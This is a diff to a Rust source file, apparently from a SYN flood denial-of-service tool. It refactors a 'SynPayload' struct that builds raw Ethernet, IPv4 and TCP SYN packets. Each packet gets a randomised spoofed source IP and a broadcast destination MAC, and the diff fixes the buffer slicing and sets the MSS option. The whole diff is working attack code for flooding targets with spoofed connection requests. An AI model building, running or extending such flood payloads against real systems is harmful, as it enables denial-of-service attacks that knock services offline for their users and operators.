@@ -7,7 +7,7 @@ use crate::util::get_random_ip;
 use crate::Result;
 
 /// A attack payload for a SYN packet.
-pub struct SYNPayload {
+pub struct SynPayload {
     /// The source IP address.
     pub src_ip: Ipv4Addr,
     /// The destination IP address.
@@ -20,7 +20,7 @@ pub struct SYNPayload {
     pub interface: datalink::NetworkInterface,
 }
 
-impl SYNPayload {
+impl SynPayload {
     pub fn new(dst_ip: Ipv4Addr, dst_port: u16, interface: &datalink::NetworkInterface) -> Self {
         Self {
             src_ip: get_random_ip(),
@@ -58,26 +58,27 @@ impl SYNPayload {
     }
 }
 
-impl super::Payload for SYNPayload {
+impl super::Payload for SynPayload {
     fn build(&mut self, packet: &mut [u8]) -> Result<()> {
         {
             let mut ethernet_header =
-                ethernet::MutableEthernetPacket::new(&mut packet[..super::ETHERNET_HEADER_LEN])
-                    .ok_or(crate::error::Error::PacketBufferTooSmall)?;
+                ethernet::MutableEthernetPacket::new(&mut packet[..super::PKT_ETH_SIZE])
+                    .ok_or(crate::error::Error::BufferTooSmall)?;
             ethernet_header.set_destination(MacAddr::broadcast());
             ethernet_header.set_source(self.interface.mac.ok_or(
                 crate::error::Error::InvalidInterface(format!(
                     "Mac address for {} is not found",
-                    self.interface.description
+                    self.interface.name
                 )),
             )?);
             ethernet_header.set_ethertype(ethernet::EtherTypes::Ipv4);
         }
 
         {
-            let mut ipv4_header =
-                ipv4::MutableIpv4Packet::new(&mut packet[super::ETHERNET_HEADER_LEN..])
-                    .ok_or(crate::error::Error::PacketBufferTooSmall)?;
+            let mut ipv4_header = ipv4::MutableIpv4Packet::new(
+                &mut packet[super::PKT_ETH_SIZE..(super::PKT_ETH_SIZE + super::PKT_IPV4_SIZE)],
+            )
+            .ok_or(crate::error::Error::BufferTooSmall)?;
             ipv4_header.set_header_length(69);
             ipv4_header.set_total_length(52);
             ipv4_header.set_next_level_protocol(ip::IpNextHeaderProtocols::Tcp);
@@ -93,8 +94,10 @@ impl super::Payload for SYNPayload {
         }
 
         {
-            let mut tcp_header = tcp::MutableTcpPacket::new(&mut packet[super::IPV4_HEADER_LEN..])
-                .ok_or(crate::error::Error::PacketBufferTooSmall)?;
+            let mut tcp_header = tcp::MutableTcpPacket::new(
+                &mut packet[(super::PKT_ETH_SIZE + super::PKT_IPV4_SIZE)..],
+            )
+            .ok_or(crate::error::Error::BufferTooSmall)?;
             tcp_header.set_source(self.src_port);
             tcp_header.set_destination(self.dst_port);
 
@@ -105,7 +108,7 @@ impl super::Payload for SYNPayload {
             tcp_header.set_flags(tcp::TcpFlags::SYN);
 
             tcp_header.set_options(&[
-                tcp::TcpOption::mss(0),
+                tcp::TcpOption::mss(1460),
                 tcp::TcpOption::sack_perm(),
                 tcp::TcpOption::nop(),
                 tcp::TcpOption::nop(),
